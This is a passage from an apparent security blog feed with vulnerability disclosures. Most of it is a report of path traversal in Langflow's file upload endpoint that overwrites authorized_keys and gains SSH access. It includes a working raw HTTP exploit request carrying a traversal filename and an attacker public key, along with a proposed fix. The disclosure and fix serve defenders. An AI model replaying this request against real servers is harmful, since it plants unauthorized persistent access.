Connection: keep-alive
Content-Type: application/json
Date: Mon, 27 May 2024 07:41:53 GMT
Keep-Alive: timeout=4
Proxy-Connection: keep-alive
Server: uvicorn

"Error occurred while uploading files."
</code></pre></div></div>

<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319">https://github.com/intel/intel-extension-for-transformers/blob/5e5e17c272857a078540dbdbdf834e65b0d92a0e/intel_extension_for_transformers/neural_chat/server/restful/retrieval_api.py#L319</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry><entry><title type="html">Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)</title><link href="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html" rel="alternate" type="text/html" title="Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in langflow Pre-release(No Response)" /><published>2024-05-26T10:31:06+08:00</published><updated>2024-05-26T10:31:06+08:00</updated><id>http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow</id><content type="html" xml:base="http://localhost:4000/file-overwrite/2024/05/26/remote-code-execution-using-path-traversal-in-langflow.html"><![CDATA[<h2 id="name">Name</h2>

<blockquote>
  <p>Remote Code Execution via Arbitrary File Overwrite Using Path Traversal in Langflow Pre-release.</p>
</blockquote>

<h2 id="weakness">Weakness</h2>

<blockquote>
  <p>CWE-22: Path Traversal</p>
</blockquote>

<h2 id="severity">Severity</h2>

<blockquote>
  <p>High (8.8)</p>
</blockquote>

<h2 id="version">Version</h2>

<blockquote>
  <p>Pre-release version: 1.0 Alpha - v1.0.0a37</p>
</blockquote>

<h2 id="description">Description</h2>

<p>The post <code class="language-plaintext highlighter-rouge">/upload/{flow_id}</code> endpoint in the Langflow <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">upload_file</a> is vulnerable to a path traversal vulnerability through the <code class="language-plaintext highlighter-rouge">filename</code> parameter which allows the uploading of arbitrary files. The <code class="language-plaintext highlighter-rouge">filename</code> is then directly append to a directory path <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">without sanitized</a> and the file content is writen to dest location. An attacker can upload and overwrite ANY file on the filesystem. This can lead to remote code execution in many different ways.</p>

<p>The vulnerable function <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34"><code class="language-plaintext highlighter-rouge">save_file</code></a>:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>async def save_file(self, flow_id: str, file_name: str, data: bytes):
        folder_path = self.data_dir / flow_id
        folder_path.mkdir(parents=True, exist_ok=True)
        file_path = folder_path / file_name

        try:
            with open(file_path, "wb") as f:
                f.write(data)
            logger.info(f"File {file_name} saved successfully in flow {flow_id}.")
        except Exception as e:
            logger.error(f"Error saving file {file_name} in flow {flow_id}: {e}")
            raise e
</code></pre></div></div>

<h2 id="proof-of-concept">Proof of Concept</h2>

<p>In this proof of concept, we will be gaining remote code execution by uploading our SSH key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file. There are many other ways to achieve remote code execution via a file upload, such as overwriting binaries, writing to .bashrc, ….</p>

<p>We proof this vulnerability by logging into the <code class="language-plaintext highlighter-rouge">kali</code> user running the langflow python API and checking that at this moment the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file does not exist.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
cat: /home/kali/.ssh/authorized_keys: No such file or directory
</code></pre></div></div>

<p>An attacker can now send the following request to the webserver. This request will upload the attacker’s public RSA key to the <code class="language-plaintext highlighter-rouge">authorized_keys</code> file.</p>

<p>We start a simple server using tutorial from <a href="https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation">https://github.com/langflow-ai/langflow?tab=readme-ov-file#-installation</a>. Note that we use pre-release versoin:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Install the pre-release version
python -m pip install langflow --pre --force-reinstall
</code></pre></div></div>
<p>Start web interface, the default port is <code class="language-plaintext highlighter-rouge">7860</code></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -m langflow run
</code></pre></div></div>

<p>Then open the Langflow web interface in browser, create a new project and in the project add a file component, click the file upload button, select random text file with burpsuite intercepting the upload request. We can see the file name and file content in the multipart request body.</p>

<p><img src="/assets/images/bughunter/langflow/file-component.png" alt="file-component" /></p>

<p><img src="/assets/images/bughunter/langflow/file-upload.png" alt="file-upload" /></p>

<p>Change the multipart <code class="language-plaintext highlighter-rouge">filename</code> to <code class="language-plaintext highlighter-rouge">../../../../../../../../../home/kali/.ssh/authorized_keys</code> and file content to our <code class="language-plaintext highlighter-rouge">authorized_keys</code> content. Repeat the upload request.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST http://127.0.0.1:7860/api/v1/files/upload/7e774022-0991-47f7-83a1-ef127d439755 HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,ja-JP;q=0.6,ja;q=0.5
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Cache-Control: no-cache
Connection: close
Cookie: access_token_lf=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjODFiMWM1Yy1lYzgxLTRkZmQtOGFiZS0yMGIxNDBmOWY3NjkiLCJleHAiOjE3NDgyMjk3NDJ9.PrPNZGIOgBql3mDBTWqmdpg4G1zYeaB-087GH5NHvYE
Origin: http://127.0.0.1:7860
Pragma: no-cache
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Host: 127.0.0.1:7860
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=--------------------------636165805457578805665550
Content-Length: 647

----------------------------636165805457578805665550
Content-Disposition: form-data; name="file"; filename="../../../../../home/kali/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
----------------------------636165805457578805665550--
</code></pre></div></div>

<p>The response indicates success with the uploaded file path.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HTTP/1.1 201 Created
Connection: close
Content-Length: 146
Access-Control-Allow-Credentials: true
Access-Control-Allow-Origin: http://127.0.0.1:7860
Content-Type: application/json
Date: Sun, 26 May 2024 03:48:37 GMT
Server: uvicorn
Vary: Origin

{"flowId":"7e774022-0991-47f7-83a1-ef127d439755","file_path":"7e774022-0991-47f7-83a1-ef127d439755/../../../../../home/kali/.ssh/authorized_keys"}
</code></pre></div></div>

<p>We can verify the success by again checking the <code class="language-plaintext highlighter-rouge">/home/kali/.ssh/authorized_keys</code> file.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@fc7d9ff6a411:/# cat /home/kali/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCov7XaSjvanAr+rs14Vz7Nn0KvVee57F5FYm8zKjmxYRb2s11r8L5L2IQPg4bMuvGcp+bouJfagdHQ/KoXD/l1IG3ZIggf67thPzGdH9gyShk2fpc1JSADkPT6WPeGAXSLh+0+InyzUqPe5oPA9zrvUDDYCKRG7NZ2A9++7hgs1DsNbJdxvYwy+8WMJAIrcfN+5QBxVHqUhUVFamyCoeu1DlalAnBSKwI61UMl0GkXN9DKMHgxSY0BMDT+AJr/F9Jwem5cTkVIr+RA9v901obfywdI/3TmPTwGwxiiZYhiWDWOaMNhyTXBWmIyBNN0usH9GtFtNPezcuUHBzsgHRcT js@dell
</code></pre></div></div>

<h2 id="fix">Fix</h2>

<p>Use <a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">UUID instead of origin file name to store the file</a>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>@router.post("/upload/{flow_id}", status_code=HTTPStatus.CREATED)
async def upload_file(
    file: UploadFile,
    flow_id: UUID = Depends(get_flow_id),
    storage_service: StorageService = Depends(get_storage_service),
):
    try:
        flow_id_str = str(flow_id)
        file_content = await file.read()
        # fix the path travesal problem
        file_name = hashlib.sha256(file_content).hexdigest()
        folder = flow_id_str
        await storage_service.save_file(flow_id=folder, file_name=file_name, data=file_content)
        return UploadFileResponse(flowId=flow_id_str, file_path=f"{folder}/{file_name}")
    except Exception as e:
        raise HTTPException(status_code=500, detail=str(e))
</code></pre></div></div>

<h2 id="impact">Impact</h2>

<p>This vulnerability can have severe consequences. This section will highlight some tangible impact.</p>

<h3 id="ssh-access">SSH Access</h3>

<p>On servers that have SSH enabled, an attacker may be able to inject their own public RSA key into the authorized_keys file, leading to remote code execution.</p>

<h3 id="web-servers">Web Servers</h3>

<p>On servers hosting web servers, various vulnerabilities can be exploited. On PHP or JSP server, remote code execution may be possible via uploading a webshell. On other servers an HTML file can be uploaded to achieve Cross-site Scripting (XSS)</p>

<h3 id="any-bounty">Any bounty</h3>

<p>Can I ask for a bug bounty award or a CVE id for this bug? Thank you very much!</p>

<h2 id="reference">Reference</h2>

<p><a href="https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e">https://huntr.com/bounties/6be8d4e3-67e6-4660-a8db-04215a1cff3e</a></p>

<h2 id="occurrences">Occurrences</h2>

<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/api/v1/files.py#L47</a></p>

<p><a href="https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34">https://github.com/langflow-ai/langflow/blob/98b011f46d3a683ef3e038dd550fed5b42af7478/src/backend/base/langflow/services/storage/local.py#L34</a></p>]]></content><author><name></name></author><category term="file-overwrite" /><summary type="html"><![CDATA[Name]]></summary></entry></feed>